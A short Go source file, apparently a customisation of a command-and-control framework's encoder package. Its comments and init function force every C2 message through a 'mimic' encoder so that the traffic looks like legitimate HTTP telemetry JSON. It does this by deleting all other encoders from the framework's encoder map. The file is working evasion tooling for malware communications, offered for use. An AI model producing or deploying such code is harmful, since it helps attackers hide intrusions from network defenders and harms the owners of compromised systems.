package encoders

// Crispud Mimic Encoder — forces mimic encoding for all C2 traffic.
// All messages will appear as legitimate HTTP telemetry JSON.

var MimicEncoderID = uint64(99999)

var Mimic *MimicEncoding

func init() {
	cfg := DefaultMimicConfig()
	Mimic, _ = NewMimicEncoding(cfg)

	// Force NativeEncoderMap to ONLY contain our mimic encoder
	// so RandomEncoder always picks it
	for k := range NativeEncoderMap {
		delete(NativeEncoderMap, k)
	}
	NativeEncoderMap[MimicEncoderID] = Mimic
}
